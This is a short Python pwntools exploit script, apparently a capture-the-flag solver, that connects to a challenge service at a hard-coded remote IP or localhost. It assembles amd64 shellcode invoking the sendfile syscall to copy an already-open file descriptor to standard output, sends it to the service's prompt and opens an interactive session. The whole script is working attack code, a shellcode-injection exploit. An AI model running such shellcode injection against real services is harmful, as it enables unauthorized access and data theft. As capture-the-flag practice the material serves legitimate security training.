from pwn import *

REMOTE = True

context.arch = 'amd64'
if REMOTE:
    HOST, PORT = '54.180.153.92', 50003

else:
    HOST, PORT = 'localhost', 50003

io = remote(HOST, PORT)
#io = process('../challenge/main')
pause()
shellcode = asm('''
mov rax, 40
mov rdi, 0x1
mov rsi, 0x5
mov rdx, 0x0
mov rcx, 0x100
syscall
''')
io.sendlineafter('> ', shellcode)
io.interactive()
